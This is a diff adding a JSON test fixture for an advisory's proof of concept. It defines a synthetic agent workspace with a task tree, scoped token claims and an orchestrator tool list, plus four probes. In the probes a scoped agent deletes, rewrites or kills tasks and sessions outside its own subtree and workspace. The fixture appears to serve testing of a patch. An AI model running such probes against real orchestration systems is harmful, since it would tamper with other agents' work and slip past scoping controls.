@@ -1,0 +1,176 @@
+{
+  "environment": {
+    "api_key": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+    "description": "Fixed environment for the GHSA-f9ff-5x35-7gfw mechanism proof: one scoped agent identity, its task tree, and the sessions bound to those tasks. Everything here is synthetic; the API key is a visible marker, not a credential.",
+    "persona": {
+      "allowed_mcp_tools": [
+        "task_create",
+        "task_list",
+        "task_search",
+        "task_show",
+        "task_start",
+        "task_complete",
+        "session_attach",
+        "session_send_input",
+        "persona_list",
+        "persona_show",
+        "ipc_spawn",
+        "ipc_write",
+        "ipc_close",
+        "ipc_terminate",
+        "ipc_list_fds",
+        "ipc_create_stream",
+        "ipc_attach",
+        "ipc_share_stream",
+        "knowledge_search",
+        "knowledge_get_node",
+        "logs_get",
+        "workpad_write",
+        "workpad_read",
+        "schedule_list",
+        "schedule_show",
+        "show_hello_widget",
+        "component_register",
+        "component_update",
+        "component_list",
+        "component_render",
+        "component_search",
+        "component_promote",
+        "widget_show",
+        "component_show",
+        "task_update",
+        "task_delete",
+        "task_resume",
+        "session_spawn",
+        "session_kill",
+        "session_status",
+        "persona_create",
+        "schedule_create",
+        "schedule_update",
+        "schedule_delete",
+        "escalate_to_human"
+      ],
+      "id": "persona-orchestrator",
+      "note": "Mirrors ORCHESTRATOR_MCP_TOOLS from packages/common/src/mcp-tool-presets.ts at the pinned vulnerable revision; it is why task_update/task_delete/task_resume/session_kill are reachable at all."
+    },
+    "schema_version": 1,
+    "scoped_token_claims": {
+      "per": "persona-orchestrator",
+      "pid": "ws-alpha",
+      "sid": "sess-caller",
+      "sub": "task-caller"
+    },
+    "sessions": [
+      {
+        "id": "sess-caller",
+        "status": "running",
+        "taskId": "task-caller"
+      },
+      {
+        "id": "sess-caller-child",
+        "status": "running",
+        "taskId": "task-caller-child"
+      },
+      {
+        "id": "sess-sibling",
+        "status": "running",
+        "taskId": "task-sibling"
+      }
+    ],
+    "tasks": [
+      {
+        "description": "Human-authoritative root of the workspace.",
+        "id": "system",
+        "parentTaskId": "",
+        "status": 1,
+        "title": "Root orchestrator task",
+        "workspaceId": "ws-alpha"
+      },
+      {
+        "description": "The scoped agent that holds the token used in every probe.",
+        "id": "task-caller",
+        "parentTaskId": "system",
+        "status": 2,
+        "title": "Attacker-controlled orchestrator task",
+        "workspaceId": "ws-alpha"
+      },
+      {
+        "description": "A descendant of the caller; operating on it is authorized.",
+        "id": "task-caller-child",
+        "parentTaskId": "task-caller",
+        "status": 2,
+        "title": "Legitimate delegated subtask",
+        "workspaceId": "ws-alpha"
+      },
+      {
+        "description": "Shares a parent with the caller but is not its descendant.",
+        "id": "task-sibling",
+        "parentTaskId": "system",
+        "status": 2,
+        "title": "Peer task owned by another agent",
+        "workspaceId": "ws-alpha"
+      },
+      {
+        "description": "Descendant of the peer, not of the caller.",
+        "id": "task-nephew",
+        "parentTaskId": "task-sibling",
+        "status": 1,
+        "title": "Subtask of the peer task",
+        "workspaceId": "ws-alpha"
+      },
+      {
+        "description": "Out of the caller's workspace; used to describe the cross-workspace variant.",
+        "id": "task-foreign",
+        "parentTaskId": "",
+        "status": 1,
+        "title": "Task in another workspace",
+        "workspaceId": "ws-beta"
+      }
+    ]
+  },
+  "probes": [
+    {
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-sibling"
+      },
+      "id": "delete_non_descendant_task",
+      "note": "F2: task_delete carries no ancestry check in the vulnerable tool layer, so deleteTask reaches the backend.",
+      "target": "task-sibling",
+      "tool": "task_delete"
+    },
+    {
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-sibling",
+        "title": "rewritten-by-non-ancestor"
+      },
+      "id": "update_non_descendant_task",
+      "note": "F2: task_update carries no ancestry check either; the changed title comes back in the tool result.",
+      "target": "task-sibling",
+      "tool": "task_update"
+    },
+    {
+      "actor": "scoped",
+      "args": {
+        "sessionId": "sess-sibling"
+      },
+      "id": "kill_sibling_session",
+      "note": "F6: session_kill resolves neither the session nor its owning task before killing it.",
+      "target": "sess-sibling",
+      "tool": "session_kill"
+    },
+    {
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-foreign"
+      },
+      "id": "delete_cross_workspace_task",
+      "note": "Same missing check across a workspace boundary: the target lives in ws-beta while the caller is bound to ws-alpha.",
+      "target": "task-foreign",
+      "tool": "task_delete"
+    }
+  ],
+  "scenario": "attack",
+  "variant": "patched"
+}
